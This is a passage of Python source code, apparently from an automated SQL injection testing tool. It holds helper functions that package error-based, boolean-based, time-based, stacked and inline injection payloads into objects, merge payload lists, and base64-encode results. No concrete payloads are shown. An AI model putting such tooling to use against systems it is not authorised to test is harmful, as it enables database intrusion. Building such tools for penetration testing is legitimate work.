            if backend and dbms:
                backend = dbms
            elif backend and not dbms:
                backend = backend
            else:
                backend = None
            __temp = []
            for comment in comments:
                pref = comment.get("pref")
                suf = comment.get("suf")
                _p = Payload(
                    prefix=pref,
                    suffix=suf,
                    string="{}{}{}".format(pref, _, suf),
                    raw=_,
                )
                __temp.append(_p)
            _r = Response(
                dbms=backend,
                type="error-based",
                title=title,
                payloads=__temp,
                vector=vector,
            )
            _temp.append(_r)
    return _temp


def merge_time_based_attack_payloads(time_based, stacked_queries):
    _temp = []
    timed = len(time_based)
    stacked = len(stacked_queries)

    for i in range(max(timed, stacked)):
        if i < timed:
            _temp.append(time_based[i])
        if i < stacked:
            _temp.append(stacked_queries[i])

    return _temp


def payloads_to_objects(records):
    ParameterResult = collections.namedtuple(
        "ParameterResult",
        ["parameter", "backend", "injection_type", "result"],
    )
    seen = set()
    _temp = []
    for entry in records:
        parameter = json.loads(entry.parameter)
        parameter = Struct(**parameter)
        if parameter.key not in seen:
            seen.add(parameter.key)
            out = []
            for entry in records:
                ok = Struct(**json.loads(entry.parameter))
                title = entry.title
                vector = entry.vector
                payload = entry.payload
                backend = entry.backend
                attempts = entry.attempts
                endpoint = entry.endpoint
                payload_type = entry.payload_type
                injection_type = entry.injection_type
                cases = entry.cases
                if cases:
                    conf.cases = [i.strip() for i in cases.split(",")]
                attack01 = base64.b64decode(entry.attack01).decode()
                string = entry.string
                not_string = entry.not_string
                if ok.key == parameter.key:
                    if payload_type.startswith("boolean-based"):
                        attack01 = Struct(**json.loads(attack01))
                        res = {
                            "title": title,
                            "backend": backend,
                            "payload": payload,
                            "vector": vector,
                            "attempts": attempts,
                            "endpoint": endpoint,
                            "payload_type": payload_type,
                            "injection_type": injection_type,
                            "parameter": ok,
                            "attack01": attack01,
                            "string": string,
                            "not_string": not_string,
                        }
                        res = Struct(**res)
                        out.append(res)
                    if payload_type.startswith("error-based"):
                        res = {
                            "title": title,
                            "backend": backend,
                            "payload": payload,
                            "vector": vector,
                            "attempts": attempts,
                            "endpoint": endpoint,
                            "payload_type": payload_type,
                            "injection_type": injection_type,
                            "parameter": ok,
                            "attack01": attack01,
                            "string": string,
                            "not_string": not_string,
                        }
                        res = Struct(**res)
                        out.append(res)
                    if payload_type.startswith("time-based"):
                        res = {
                            "title": title,
                            "backend": backend,
                            "payload": payload,
                            "vector": vector,
                            "attempts": attempts,
                            "endpoint": endpoint,
                            "payload_type": payload_type,
                            "injection_type": injection_type,
                            "parameter": ok,
                            "attack01": attack01,
                            "string": string,
                            "not_string": not_string,
                        }
                        res = Struct(**res)
                        out.append(res)
                    if payload_type.startswith("stacked"):
                        res = {
                            "title": title,
                            "backend": backend,
                            "payload": payload,
                            "vector": vector,
                            "attempts": attempts,
                            "endpoint": endpoint,
                            "payload_type": payload_type,
                            "injection_type": injection_type,
                            "parameter": ok,
                            "attack01": attack01,
                            "string": string,
                            "not_string": not_string,
                        }
                        res = Struct(**res)
                        out.append(res)
                    if payload_type.startswith("inline"):
                        res = {
                            "title": title,
                            "backend": backend,
                            "payload": payload,
                            "vector": vector,
                            "attempts": attempts,
                            "endpoint": endpoint,
                            "payload_type": payload_type,
                            "injection_type": injection_type,
                            "parameter": ok,
                            "attack01": attack01,
                            "string": string,
                            "not_string": not_string,
                        }
                        res = Struct(**res)
                        out.append(res)
            if out:
                _temp.append(
                    ParameterResult(
                        parameter=parameter,
                        backend=entry.backend,
                        injection_type=entry.injection_type,
                        result=out,
                    )
                )
    return _temp


def encode_object(obj, decode=False):
    if not decode:
        return base64.b64encode(json.dumps(obj).encode()).decode()
    if decode:
        return Struct(json.loads(base64.b64decode(obj).decode()))
